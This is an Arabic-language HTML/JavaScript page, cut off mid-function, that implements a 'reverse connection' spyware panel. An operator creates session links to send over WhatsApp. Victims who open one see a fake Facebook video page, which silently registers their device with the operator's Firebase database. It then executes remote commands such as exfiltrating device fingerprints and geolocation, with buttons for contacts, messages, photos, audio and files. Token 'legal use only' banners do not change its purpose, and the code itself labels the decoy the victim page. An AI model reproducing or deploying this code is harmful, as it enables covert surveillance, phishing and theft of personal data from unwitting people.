<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الإدارة المتكامل - الاتصال العكسي</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-storage-compat.js"></script>
    <style>
        :root {
            --primary: #3498db;
            --success: #27ae60;
            --danger: #e74c3c;
            --warning: #f39c12;
            --dark: #2c3e50;
            --light: #ecf0f1;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* شريط التنبيه الأمني */
        .security-alert {
            background: var(--warning);
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        
        /* الهيدر */
        header {
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        h1 {
            color: var(--dark);
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        
        .subtitle {
            color: #7f8c8d;
            font-size: 1.1em;
        }
        
        /* قسم المصادقة */
        .auth-section {
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 25px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        .auth-section input {
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1em;
            margin: 10px;
            width: 250px;
        }
        
        /* الشبكة الرئيسية */
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }
        
        @media (max-width: 1100px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }
        
        /* البطاقات */
        .card {
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }
        
        .card h3 {
            color: var(--dark);
            margin-bottom: 18px;
            border-bottom: 2px solid var(--primary);
            padding-bottom: 10px;
            font-size: 1.4em;
        }
        
        /* شبكة الإحصائيات */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: var(--light);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border-left: 4px solid var(--primary);
        }
        
        .stat-number {
            font-size: 2.2em;
            font-weight: bold;
            color: var(--dark);
        }
        
        .stat-label {
            color: #7f8c8d;
            font-size: 0.9em;
        }
        
        /* الأجهزة */
        .devices-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .device-card {
            background: var(--light);
            padding: 18px;
            margin: 12px 0;
            border-radius: 10px;
            border-right: 4px solid var(--success);
            transition: all 0.3s ease;
        }
        
        .device-card:hover {
            background: #e0e0e0;
        }
        
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .device-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 8px;
        }
        
        .info-item {
            font-size: 0.9em;
        }
        
        .info-label {
            font-weight: bold;
            color: var(--dark);
        }
        
        .info-value {
            color: #7f8c8d;
        }
        
        .status-indicator {
            font-size: 0.8em;
            padding: 4px 10px;
            border-radius: 20px;
            background: var(--success);
            color: white;
        }
        
        /* الأزرار */
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 600;
            transition: all 0.3s ease;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            margin: 5px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: #2980b9;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-success:hover {
            background: #219a52;
        }
        
        .btn-warning {
            background: var(--warning);
            color: white;
        }
        
        .btn-warning:hover {
            background: #d68910;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background: #c0392b;
        }
        
        .btn-small {
            padding: 8px 15px;
            font-size: 0.85em;
        }
        
        /* روابط الجلسات - تصميم محسن */
        .session-link-container {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            color: white;
            padding: 15px;
            margin: 15px 0;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            border: 2px solid #fff;
        }
        
        .session-link-container h4 {
            margin-bottom: 10px;
            font-size: 1.1em;
        }
        
        .clickable-link {
            display: block;
            background: white;
            color: #27ae60;
            padding: 12px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            word-break: break-all;
            margin: 10px 0;
            border: 2px solid transparent;
            transition: all 0.3s ease;
        }
        
        .clickable-link:hover {
            background: #f8f9fa;
            border-color: #27ae60;
            transform: translateY(-2px);
        }
        
        .link-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        
        /* عناصر التحكم */
        .controls-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
            margin-top: 15px;
        }
        
        /* السجلات */
        .logs-container {
            max-height: 300px;
            overflow-y: auto;
            background: var(--light);
            padding: 15px;
            border-radius: 8px;
        }
        
        .log-entry {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            font-size: 0.9em;
        }
        
        .timestamp {
            color: #7f8c8d;
            font-weight: bold;
        }
        
        /* التذييل */
        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: white;
            opacity: 0.9;
        }
        
        /* صفحة الضحية (مخفية) */
        .victim-page {
            display: none;
            background: #1877f2;
            color: white;
            min-height: 100vh;
            text-align: center;
            padding: 50px 20px;
        }
        
        .video-container {
            background: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 500px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }
        
        .video-placeholder {
            background: #000;
            height: 300px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            margin: 15px 0;
        }
        
        /* التبويبات */
        .tabs {
            display: flex;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            overflow: hidden;
        }
        
        .tab {
            padding: 15px 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            flex: 1;
        }
        
        .tab.active {
            background: var(--primary);
            color: white;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* الإشعارات */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            z-index: 1000;
            transform: translateX(150%);
            transition: transform 0.3s ease;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        /* التكيف مع الشاشات الصغيرة */
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            h1 {
                font-size: 1.8em;
            }
            
            .main-grid {
                grid-template-columns: 1fr;
            }
            
            .device-info {
                grid-template-columns: 1fr;
            }
            
            .link-actions {
                flex-direction: column;
            }
            
            .tabs {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <!-- شريط التنبيه الأمني -->
    <div class="security-alert">
        ⚠️ نظام للاستخدام القانوني فقط - يرجى التأكد من الحصول على الموافقات اللازمة قبل الاستخدام
    </div>

    <!-- إشعار النسخ -->
    <div id="copyNotification" class="notification">
        ✅ تم نسخ الرابط بنجاح!
    </div>

    <div class="container">
        <!-- لوحة التحكم (تظهر عند عدم وجود جلسة) -->
        <div id="controlPanel">
            <header>
                <h1>🔄 نظام الاتصال العكسي المتكامل</h1>
                <p class="subtitle">إدارة الأجهزة والجلسات عن بُعد - النسخة المحسنة</p>
            </header>

            <!-- قسم المصادقة -->
            <div id="authSection" class="auth-section">
                <h3>🔐 مصادقة المسؤول</h3>
                <input type="password" id="adminPassword" placeholder="أدخل كلمة المرور الإدارية">
                <button class="btn btn-primary" onclick="authenticate()">دخول النظام</button>
                <p style="margin-top: 10px; font-size: 0.9em; color: #7f8c8d;">كلمة المرور الافتراضية: admin123</p>
            </div>

            <!-- لوحة التحكم (تظهر بعد المصادقة) -->
            <div id="dashboard" class="dashboard" style="display: none;">
                <!-- التبويبات -->
                <div class="tabs">
                    <div class="tab active" onclick="switchTab('overview')">نظرة عامة</div>
                    <div class="tab" onclick="switchTab('sessions')">إدارة الجلسات</div>
                    <div class="tab" onclick="switchTab('devices')">الأجهزة المتصلة</div>
                    <div class="tab" onclick="switchTab('commands')">الأوامر</div>
                    <div class="tab" onclick="switchTab('results')">النتائج</div>
                </div>

                <!-- محتوى التبويب: نظرة عامة -->
                <div id="overview" class="tab-content active">
                    <div class="main-grid">
                        <!-- بطاقة الإحصائيات -->
                        <div class="card">
                            <h3>📊 إحصائيات النظام</h3>
                            <div class="stats-grid">
                                <div class="stat-card">
                                    <div class="stat-number" id="connectedCount">0</div>
                                    <div class="stat-label">الأجهزة المتصلة</div>
                                </div>
                                <div class="stat-card">
                                    <div class="stat-number" id="sessionsCount">0</div>
                                    <div class="stat-label">الجلسات النشطة</div>
                                </div>
                                <div class="stat-card">
                                    <div class="stat-number" id="commandsCount">0</div>
                                    <div class="stat-label">الأوامر المرسلة</div>
                                </div>
                                <div class="stat-card">
                                    <div class="stat-number" id="resultsCount">0</div>
                                    <div class="stat-label">النتائج المستلمة</div>
                                </div>
                            </div>
                        </div>

                        <!-- بطاقة إنشاء الجلسات -->
                        <div class="card">
                            <h3>🎯 إنشاء جلسة عكسية</h3>
                            <p>قم بإنشاء رابط جلسة عكسية وإرساله للجهاز المستهدف. يمكن نسخ الرابط ومشاركته مباشرة في الواتساب أو أي تطبيق مراسلة.</p>
                            <button class="btn btn-success" onclick="createReverseSession()">🎪 إنشاء جلسة جديدة</button>
                            <div id="sessionLinksContainer" style="margin-top: 20px;"></div>
                        </div>
                    </div>

                    <!-- بطاقة آخر النشاطات -->
                    <div class="card">
                        <h3>📝 آخر النشاطات</h3>
                        <div id="recentActivity" class="logs-container">
                            <div class="log-entry">
                                <span class="timestamp">[جاري التحميل...]</span>
                                <span class="message">يتم تحميل سجل النشاطات</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- محتوى التبويب: إدارة الجلسات -->
                <div id="sessions" class="tab-content">
                    <div class="card">
                        <h3>🔄 الجلسات النشطة</h3>
                        <div id="sessionsList">
                            <p>جاري تحميل الجلسات النشطة...</p>
                        </div>
                    </div>
                </div>

                <!-- محتوى التبويب: الأجهزة المتصلة -->
                <div id="devices" class="tab-content">
                    <div class="card">
                        <h3>📱 الأجهزة المتصلة</h3>
                        <div id="devicesContainer" class="devices-list">
                            <p>جاري تحميل قائمة الأجهزة...</p>
                        </div>
                    </div>
                </div>

                <!-- محتوى التبويب: الأوامر -->
                <div id="commands" class="tab-content">
                    <div class="main-grid">
                        <!-- بطاقة الأوامر السريعة -->
                        <div class="card">
                            <h3>⚡ أوامر سريعة</h3>
                            <div class="controls-grid">
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_info')">📱 معلومات الجهاز</button>
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_location')">📍 الموقع الجغرافي</button>
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_contacts')">👥 جهات الاتصال</button>
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_messages')">💬 الرسائل</button>
                                <button class="btn btn-warning" onclick="sendCommandToAll('take_photo')">📸 التقاط صورة</button>
                                <button class="btn btn-warning" onclick="sendCommandToAll('record_audio')">🎙️ تسجيل صوت</button>
                                <button class="btn btn-warning" onclick="sendCommandToAll('get_files')">📂 الملفات</button>
                                <button class="btn btn-danger" onclick="sendCommandToAll('vibrate')">📳 اهتزاز</button>
                            </div>
                        </div>

                        <!-- بطاقة الأوامر المخصصة -->
                        <div class="card">
                            <h3>🎛️ أوامر مخصصة</h3>
                            <div style="margin-bottom: 15px;">
                                <label for="customCommand" style="display: block; margin-bottom: 8px; font-weight: bold;">الأمر المخصص:</label>
                                <input type="text" id="customCommand" placeholder="أدخل الأمر المطلوب تنفيذه" style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px;">
                            </div>
                            <button class="btn btn-primary" onclick="sendCustomCommand()">🚀 إرسال الأمر</button>
                        </div>
                    </div>
                </div>

                <!-- محتوى التبويب: النتائج -->
                <div id="results" class="tab-content">
                    <div class="card">
                        <h3>📄 النتائج المستلمة</h3>
                        <div id="resultsContainer" class="logs-container">
                            <p>جاري تحميل النتائج...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- صفحة الضحية (تظهر عند فتح رابط الجلسة) -->
        <div id="victimPage" class="victim-page">
            <div style="max-width: 600px; margin: 0 auto;">
                <h1 style="font-size: 2em; margin-bottom: 10px;">🎥 فيديو فيسبوك</h1>
                <p style="margin-bottom: 30px; opacity: 0.9;">فيديو مثير للاهتمام من صديقك</p>
                
                <div class="video-container">
                    <h3 style="color: #1877f2; margin-bottom: 15px;">فيديو حصري 🌟</h3>
                    <div class="video-placeholder">
                        <div style="text-align: center;">
                            <div style="font-size: 3em; margin-bottom: 10px;">▶️</div>
                            <p style="color: white; font-size: 1.2em;">جاري تحميل الفيديو...</p>
                            <p style="color: #ccc; font-size: 0.9em; margin-top: 10px;">سيبدأ التشغيل تلقائياً</p>
                        </div>
                    </div>
                    <div style="display: flex; justify-content: space-between; margin-top: 15px; color: #666; font-size: 0.9em;">
                        <span>👁️ 2.3K مشاهدة</span>
                        <span>❤️ 154 إعجاب</span>
                        <span>🕒 5:30 دقيقة</span>
                    </div>
                </div>
                
                <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; margin-top: 20px;">
                    <p style="margin-bottom: 10px;">📱 تم تحميل الفيديو بنجاح على جهازك</p>
                    <p style="font-size: 0.9em; opacity: 0.8;">جاري إعداد التشغيل الأمثل...</p>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <p>© 2024 نظام الإدارة المتكامل - للاستخدام القانوني والمصرح به فقط</p>
    </footer>

    <script>
        // تكوين Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyD9aLabUWNfgjqoIuZSYNm1X8kAtM-Eac8",
            authDomain: "andex-html.firebaseapp.com",
            databaseURL: "https://andex-html-default-rtdb.firebaseio.com",
            projectId: "andex-html",
            storageBucket: "andex-html.firebasestorage.app",
            messagingSenderId: "94749059385",
            appId: "1:94749059385:web:a0b449d411a93cd75520e8",
            measurementId: "G-QH61RWKH8K"
        };
        
        // تهيئة Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();

        // فئات النظام
        class ReverseConnectionSystem {
            constructor() {
                this.isAuthenticated = false;
                this.sessions = {};
                this.connectedDevices = {};
                this.commands = {};
                this.results = {};
                this.activityLogs = [];
                this.init();
            }

            init() {
                this.checkPageMode();
                this.setupSecurityWarning();
            }

            // التحقق من نمط الصفحة (لوحة تحكم أو صفحة ضحية)
            checkPageMode() {
                const urlParams = new URLSearchParams(window.location.search);
                const sessionId = urlParams.get('session');
                
                if (sessionId) {
                    // عرض صفحة الضحية
                    document.getElementById('controlPanel').style.display = 'none';
                    document.getElementById('victimPage').style.display = 'block';
                    this.initVictimMode(sessionId);
                } else {
                    // عرض لوحة التحكم
                    document.getElementById('controlPanel').style.display = 'block';
                    document.getElementById('victimPage').style.display = 'none';
                }
            }

            // تحذير أمني
            setupSecurityWarning() {
                console.log(`
                ⚠️  تحذير أمني:
                - هذا النظام للاستخدام القانوني فقط
                - يجب الحصول على موافقة المستخدم
                - جميع الأنشطة مسجلة ومراقبة
                `);
            }

            // مصادقة المسؤول
            authenticate() {
                const password = document.getElementById('adminPassword').value;
                // في التطبيق الحقيقي، استخدم مصادقة آمنة
                if (password === 'admin123') {
                    this.isAuthenticated = true;
                    document.getElementById('authSection').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'block';
                    this.startMonitoring();
                    this.logActivity('تمت مصادقة المسؤول بنجاح');
                } else {
                    alert('كلمة المرور غير صحيحة - استخدم: admin123');
                }
            }

            // بدء المراقبة
            startMonitoring() {
                if (!this.isAuthenticated) return;

                // مراقبة الجلسات
                database.ref('sessions').on('value', (snapshot) => {
                    this.sessions = snapshot.val() || {};
                    this.updateSessionsDisplay();
                    this.updateDashboard();
                });

                // مراقبة الأجهزة
                database.ref('devices').on('value', (snapshot) => {
                    this.connectedDevices = snapshot.val() || {};
                    this.updateDevicesDisplay();
                    this.updateDashboard();
                });

                // مراقبة الأوامر
                database.ref('commands').on('value', (snapshot) => {
                    this.commands = snapshot.val() || {};
                    this.updateDashboard();
                });

                // مراقبة النتائج
                database.ref('results').on('value', (snapshot) => {
                    this.results = snapshot.val() || {};
                    this.updateResultsDisplay();
                    this.updateDashboard();
                });
            }

            // إنشاء جلسة عكسية جديدة
            createReverseSession() {
                if (!this.isAuthenticated) return;

                const sessionId = this.generateSessionId();
                const sessionUrl = `${window.location.origin}${window.location.pathname}?session=${sessionId}`;
                
                this.sessions[sessionId] = {
                    id: sessionId,
                    url: sessionUrl,
                    created: Date.now(),
                    status: 'waiting',
                    device: null
                };

                this.saveSession(sessionId);
                this.displaySessionLink(sessionUrl, sessionId);
                this.logActivity(`تم إنشاء جلسة جديدة: ${sessionId}`);
            }

            generateSessionId() {
                return 'sess_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
            }

            // حفظ الجلسة في Firebase
            saveSession(sessionId) {
                database.ref('sessions/' + sessionId).set(this.sessions[sessionId]);
            }

            // عرض رابط الجلسة - تصميم محسن
            displaySessionLink(url, sessionId) {
                const container = document.getElementById('sessionLinksContainer');
                const linkElement = document.createElement('div');
                linkElement.className = 'session-link-container';
                linkElement.innerHTML = `
                    <h4>🔗 رابط الجلسة الجديدة</h4>
                    <p style="margin-bottom: 10px; font-size: 0.9em;">انقر على الرابط أدناه لنسخه أو شاركه مباشرة:</p>
                    
                    <a href="${url}" target="_blank" class="clickable-link">
                        ${url}
                    </a>
                    
                    <div class="link-actions">
                        <button class="btn btn-small btn-primary" onclick="copyToClipboard('${url}')">
                            📋 نسخ الرابط
                        </button>
                        <button class="btn btn-small btn-success" onclick="shareSession('${url}')">
                            📤 مشاركة في الواتساب
                        </button>
                        <button class="btn btn-small btn-warning" onclick="testSession('${url}')">
                            🧪 اختبار الجلسة
                        </button>
                    </div>
                    
                    <div style="margin-top: 10px; font-size: 0.8em; opacity: 0.8;">
                        <strong>معرف الجلسة:</strong> ${sessionId}
                    </div>
                `;
                container.appendChild(linkElement);
            }

            // تحديث عرض الجلسات
            updateSessionsDisplay() {
                const container = document.getElementById('sessionsList');
                
                if (Object.keys(this.sessions).length === 0) {
                    container.innerHTML = '<p>لا توجد جلسات نشطة حالياً</p>';
                    return;
                }
                
                container.innerHTML = '';

                Object.keys(this.sessions).forEach(sessionId => {
                    const session = this.sessions[sessionId];
                    const sessionElement = document.createElement('div');
                    sessionElement.className = 'device-card';
                    sessionElement.innerHTML = `
                        <div class="device-header">
                            <strong>الجلسة: ${sessionId.substring(0, 12)}...</strong>
                            <span class="status-indicator">${session.status === 'connected' ? '🟢 نشطة' : '🟣 في الانتظار'}</span>
                        </div>
                        <div class="device-info">
                            <div class="info-item">
                                <span class="info-label">الرابط:</span>
                                <span class="info-value" style="word-break: break-all;">${session.url}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">أنشئت:</span>
                                <span class="info-value">${new Date(session.created).toLocaleString('ar-SA')}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">الحالة:</span>
                                <span class="info-value">${session.status}</span>
                            </div>
                        </div>
                    `;
                    container.appendChild(sessionElement);
                });
            }

            // تحديث عرض الأجهزة
            updateDevicesDisplay() {
                const container = document.getElementById('devicesContainer');
                
                if (Object.keys(this.connectedDevices).length === 0) {
                    container.innerHTML = '<p>لا توجد أجهزة متصلة حالياً</p>';
                    return;
                }
                
                container.innerHTML = '';

                Object.keys(this.connectedDevices).forEach(deviceId => {
                    const device = this.connectedDevices[deviceId];
                    const deviceElement = document.createElement('div');
                    deviceElement.className = 'device-card';
                    deviceElement.innerHTML = `
                        <div class="device-header">
                            <strong>${this.getDeviceName(device.model)}</strong>
                            <span class="status-indicator">🟢 متصل</span>
                        </div>
                        <div class="device-info">
                            <div class="info-item">
                                <span class="info-label">المعرف:</span>
                                <span class="info-value">${deviceId.substring(0, 10)}...</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">البطارية:</span>
                                <span class="info-value">${device.battery || 'غير معروف'}%</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">النظام:</span>
                                <span class="info-value">${this.getOSName(device.version)}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">الشبكة:</span>
                                <span class="info-value">${device.provider || 'غير معروف'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">آخر نشاط:</span>
                                <span class="info-value">${new Date(device.timestamp || Date.now()).toLocaleString('ar-SA')}</span>
                            </div>
                        </div>
                        <div style="margin-top: 10px;">
                            <button class="btn btn-small btn-primary" onclick="sendCommand('${deviceId}', 'get_info')">📊 معلومات</button>
                            <button class="btn btn-small btn-primary" onclick="sendCommand('${deviceId}', 'get_location')">📍 موقع</button>
                            <button class="btn btn-small btn-warning" onclick="sendCommand('${deviceId}', 'take_photo')">📸 صورة</button>
                            <button class="btn btn-small btn-danger" onclick="sendCommand('${deviceId}', 'vibrate')">📳 اهتزاز</button>
                        </div>
                    `;
                    container.appendChild(deviceElement);
                });
            }

            // تحسين اسم الجهاز
            getDeviceName(userAgent) {
                if (!userAgent) return 'جهاز غير معروف';
                
                if (userAgent.includes('Android')) return '📱 هاتف أندرويد';
                if (userAgent.includes('iPhone')) return '📱 هاتف آيفون';
                if (userAgent.includes('Windows')) return '💻 كمبيوتر ويندوز';
                if (userAgent.includes('Mac')) return '💻 كمبيوتر ماك';
                if (userAgent.includes('Linux')) return '💻 كمبيوتر لينكس';
                
                return '🌐 جهاز متصل';
            }

            // تحسين اسم النظام
            getOSName(platform) {
                if (!platform) return 'غير معروف';
                
                if (platform.includes('Win')) return 'Windows';
                if (platform.includes('Mac')) return 'macOS';
                if (platform.includes('Linux')) return 'Linux';
                if (platform.includes('Android')) return 'Android';
                if (platform.includes('iOS')) return 'iOS';
                
                return platform;
            }

            // تحديث عرض النتائج
            updateResultsDisplay() {
                const container = document.getElementById('resultsContainer');
                
                if (Object.keys(this.results).length === 0) {
                    container.innerHTML = '<p>لا توجد نتائج مستلمة حالياً</p>';
                    return;
                }
                
                container.innerHTML = '';

                Object.keys(this.results).forEach(deviceId => {
                    const deviceResults = this.results[deviceId];
                    Object.keys(deviceResults).forEach(resultType => {
                        const result = deviceResults[resultType];
                        const resultElement = document.createElement('div');
                        resultElement.className = 'log-entry';
                        
                        let resultText = '';
                        if (resultType === 'device_info') {
                            resultText = `معلومات الجهاز: ${result.userAgent || 'غير متوفر'}`;
                        } else if (resultType === 'location') {
                            if (result.lat) {
                                resultText = `الموقع: ${result.lat.toFixed(4)}, ${result.lon.toFixed(4)}`;
                            } else {
                                resultText = `الموقع: ${result.error || 'غير متوفر'}`;
                            }
                        } else if (resultType === 'contacts') {
                            resultText = `جهات الاتصال: ${result.count} جهة`;
                        } else if (resultType === 'messages') {
                            resultText = `الرسائل: ${result.count} رسالة`;
                        } else {
                            resultText = `${resultType}: ${JSON.stringify(result)}`;
                        }
                        
                        resultElement.innerHTML = `
                            <span class="timestamp">[${new Date(result.timestamp || Date.now()).toLocaleString('ar-SA')}]</span>
                            <span class="message">${deviceId.substring(0, 8)}... - ${resultText}</span>
                        `;
                        container.appendChild(resultElement);
                    });
                });
            }

            // تحديث لوحة التحكم
            updateDashboard() {
                const activeDevices = Object.keys(this.connectedDevices).length;
                const activeSessions = Object.keys(this.sessions).length;
                const commandsCount = Object.keys(this.commands).length;
                const resultsCount = Object.keys(this.results).length;
                
                document.getElementById('connectedCount').textContent = activeDevices;
                document.getElementById('sessionsCount').textContent = activeSessions;
                document.getElementById('commandsCount').textContent = commandsCount;
                document.getElementById('resultsCount').textContent = resultsCount;

                // تحديث سجل النشاطات
                this.updateActivityLog();
            }

            // تحديث سجل النشاطات
            updateActivityLog() {
                const container = document.getElementById('recentActivity');
                
                if (this.activityLogs.length === 0) {
                    container.innerHTML = '<div class="log-entry"><span class="timestamp">[لا توجد نشاطات]</span><span class="message">سيظهر سجل النشاطات هنا</span></div>';
                    return;
                }
                
                container.innerHTML = '';

                // عرض آخر 10 نشاطات
                const recentLogs = this.activityLogs.slice(-10).reverse();
                recentLogs.forEach(log => {
                    const logElement = document.createElement('div');
                    logElement.className = 'log-entry';
                    logElement.innerHTML = `
                        <span class="timestamp">[${new Date(log.timestamp).toLocaleString('ar-SA')}]</span>
                        <span class="message">${log.message}</span>
                    `;
                    container.appendChild(logElement);
                });
            }

            // تسجيل نشاط
            logActivity(message) {
                this.activityLogs.push({
                    message: message,
                    timestamp: Date.now()
                });
                this.updateActivityLog();
            }

            // إرسال أمر لجهاز معين
            sendCommand(deviceId, command) {
                if (!this.isAuthenticated) return;

                database.ref('commands/' + deviceId).set({
                    command: command,
                    timestamp: Date.now(),
                    status: 'pending'
                });

                this.logActivity(`تم إرسال أمر ${command} إلى الجهاز ${deviceId.substring(0, 8)}...`);
            }

            // إرسال أمر لجميع الأجهزة
            sendCommandToAll(command) {
                if (!this.isAuthenticated) return;

                Object.keys(this.connectedDevices).forEach(deviceId => {
                    this.sendCommand(deviceId, command);
                });
                
                this.logActivity(`تم إرسال أمر ${command} إلى جميع الأجهزة`);
            }

            // تبديل التبويبات
            switchTab(tabName) {
                // إخفاء جميع المحتويات
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                // إلغاء تنشيط جميع التبويبات
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                // تفعيل التبويب المحدد
                document.getElementById(tabName).classList.add('active');
                event.target.classList.add('active');
            }

            // تهيئة وضع الضحية
            initVictimMode(sessionId) {
                // تسجيل الجهاز
                const deviceId = this.generateDeviceId();
                const deviceInfo = {
                    id: deviceId,
                    sessionId: sessionId,
                    model: this.getDeviceModel(),
                    version: this.getOSVersion(),
                    battery: this.getBatteryLevel(),
                    provider: this.getNetworkProvider(),
                    timestamp: Date.now(),
                    status: 'connected'
                };

                // حفظ معلومات الجهاز
                database.ref('devices/' + deviceId).set(deviceInfo);
                database.ref('sessions/' + sessionId).update({
                    device: deviceId,
                    status: 'connected'
                });

                // الاستماع للأوامر
                database.ref('commands/' + deviceId).on('value', (snapshot) => {
                    const command = snapshot.val();
                    if (command && command.status === 'pending') {
                        this.executeCommand(command.command, deviceId);
                        // مسح الأمر بعد التنفيذ
                        database.ref('commands/' + deviceId).remove();
                    }
                });

                // تحديث النشاط كل 30 ثانية
                setInterval(() => {
                    database.ref('devices/' + deviceId + '/timestamp').set(Date.now());
                }, 30000);

                // محاكاة تحميل الفيديو
                setTimeout(() => {
                    const videoText = document.querySelector('.video-placeholder p');
                    if (videoText) {
                        videoText.innerHTML = '✅ تم تحميل الفيديو بنجاح<br><small>جاري التشغيل...</small>';
                    }
                }, 2000);
            }

            generateDeviceId() {
                return 'dev_' + Math.random().toString(36).substring(2, 15);
            }

            getDeviceModel() {
                return navigator.userAgent;
            }

            getOSVersion() {
                return navigator.platform;
            }

            getBatteryLevel() {
                // محاكاة مستوى البطارية
                return Math.floor(Math.random() * 100);
            }

            getNetworkProvider() {
                // محاكاة مزود الشبكة
                const providers = ['STC', 'Mobily', 'Zain', 'الاتصالات السعودية'];
                return providers[Math.floor(Math.random() * providers.length)];
            }

            executeCommand(command, deviceId) {
                switch(command) {
                    case 'get_info':
                        this.collectDeviceInfo(deviceId);
                        break;
                    case 'get_location':
                        this.getLocation(deviceId);
                        break;
                    case 'get_contacts':
                        this.getContacts(deviceId);
                        break;
                    case 'get_messages':
                        this.getMessages(deviceId);
                        break;
                    case 'take_photo':
                        this.takePhoto(deviceId);
                        break;
                    case 'record_audio':
                        this.recordAudio(deviceId);
                        break;
                    case 'get_files':
                        this.getFiles(deviceId);
                        break;
                    case 'vibrate':
                        this.vibrate(deviceId);
                        break;
                    default:
                        console.log('أمر غير معروف:', command);
                }
            }

            collectDeviceInfo(deviceId) {
                const info = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    java: navigator.javaEnabled(),
                    timestamp: Date.now()
                };
                
                database.ref('results/' + deviceId + '/device_info').set(info);
            }

            getLocation(deviceId) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        database.ref('results/' + deviceId + '/location').set({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
